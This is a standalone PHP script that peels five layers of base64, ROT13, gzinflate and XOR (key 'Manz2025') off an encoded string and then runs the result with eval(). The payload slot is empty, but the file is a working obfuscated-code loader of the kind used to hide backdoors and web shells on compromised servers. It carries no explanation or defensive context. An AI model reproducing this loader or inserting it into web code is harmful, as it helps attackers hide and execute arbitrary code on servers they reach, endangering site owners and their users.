<?php
function run_layered_code($encoded, $key) {
    for ($i = 0; $i < 5; $i++) {
        $decoded = base64_decode(str_rot13(base64_decode($encoded)));
        $decompressed = gzinflate($decoded);
        $out = '';
        for ($j = 0; $j < strlen($decompressed); $j++) {
            $out .= chr(ord($decompressed[$j]) ^ ord($key[$j % strlen($key)]));
        }
        $encoded = $out;
    }
    eval($encoded);
}
$payload = '';
$key = 'Manz2025';
run_layered_code($payload, $key);
?>
